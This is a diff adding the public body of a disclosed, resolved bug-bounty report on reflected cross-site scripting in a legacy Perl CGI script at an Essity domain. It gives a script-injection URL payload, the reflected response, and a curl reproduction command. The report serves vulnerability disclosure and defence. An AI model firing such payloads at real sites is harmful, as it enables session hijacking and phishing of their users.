@@ -8,6 +8,7 @@ tags:
 substate: "resolved"
 weakness: "Cross-site Scripting (XSS) - Reflected"
 enriched: true
+body: true
 date: 2026-06-30
 submitted: 2026-06-29T03:16:36.099Z
 bounty_usd: null
@@ -25,6 +26,55 @@ title: "Reflected XSS in legacy CGI script /cgi-bin/████████.pl 
 - Report: [https://hackerone.com/reports/3830771](https://hackerone.com/reports/3830771)
 - CWE: Cross-site Scripting (XSS) - Reflected
 - Submitted: 2026-06-29T03:16:36.099Z
+
+## Report body
+
+Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).
+
+## Summary:
+The legacy Perl CGI script at ``https://████████/cgi-bin/████████.pl`` reflects 
+user-supplied input from the `████████` parameter directly into the HTML response 
+without output encoding. This allows unauthenticated reflected XSS via both 
+GET and POST requests.
+
+## Steps To Reproduce:
+
+1. Send the following GET request (no authentication required):
+
+``https://████████/cgi-bin/████████.pl?action=Register&████████=%3Cscript%3Ealert(document.domain)%3C%2Fscript%3E&last=████████&████████=123``
+
+2. Observe the response body contains the payload unencoded:
+
+```
+<br>
+<script>alert(document.domain)</script> ████████, Tel: 123
+<br>
+```
+
+3. Confirm via curl:
+
+```
+curl -sk -H "X-HackerOne-Research: ████████" \
+
+"https://████████/cgi-bin/████████.pl?action=Register&████████=%3Cscript%3Ealert(document.domain)%3C%2Fscript%3E&last=████████&████████=123"
+
+```
+
+Both GET and POST methods are affected. The `last` and `████████` parameters 
+are also reflected but were not ████████ed beyond confirmation.
+
+## Supporting Material/References:
+- curl output confirming unencoded reflection attached
+- Affected script metadata: generator="████████:/cgi-bin/████████.pl", 
+  author="████████" (legacy SCA/Essity internal tool)
+
+## Impact
+
+Arbitrary JavaScript execution in the ████████ origin against any 
+user following a crafted link. No authentication required. Enables session 
+hijacking, credential phishing under an Essity domain, and content injection/
+defacement. The affected script also leaks internal infrastructure metadata 
+(internal hostname ████████ visible in page source).
 
 ## Timeline
 
